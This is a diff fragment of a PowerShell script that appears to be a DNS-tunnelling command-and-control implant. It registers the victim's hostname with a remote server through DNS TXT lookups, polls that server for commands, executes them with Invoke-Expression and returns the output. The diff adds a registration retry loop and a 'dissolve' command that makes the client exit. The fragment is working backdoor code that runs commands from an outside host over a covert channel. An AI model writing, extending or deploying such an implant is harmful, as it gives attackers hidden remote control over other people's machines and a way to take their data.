@@ -43,16 +43,29 @@ function send_response($response) {
     $k = $(Resolve-DnsName -Server $server -Name "$id.$encCmd.$name" -Type TXT)
 }
 
+function dissolve(){
+    $encCmd = StringToHex('dis')
+    $(Resolve-DnsName -Server $server -Name "$id.$encCmd.$name" -Type TXT)
+    Exit
+}
+
 #initialize
 $encHostname = StringtoHex($hostname)
 $encCmd = StringToHex('int')
 $id = $(Resolve-DnsName -Server $server -Name "$encHostname.0.$encCmd.$name" -Type TXT).Strings
+while (!$id){
+    sleep -Seconds 60
+    $id = $(Resolve-DnsName -Server $server -Name "$encHostname.0.$encCmd.$name" -Type TXT).Strings
+}
 
 while ($true) {
     $encCmd = StringToHex('cmd')
     $cmd = $(Resolve-DnsName -Server $server -Name "$id.$encCmd.$name" -Type TXT).Strings
 
     if ($cmd.length -ne 0) {
+        if ($cmd -eq "dissolve"){                       # server wants the client to dissolve
+            dissolve
+        }
         $response = (iex "$cmd" -ErrorVariable cmdError) | Out-String
         $response += $cmdError
         
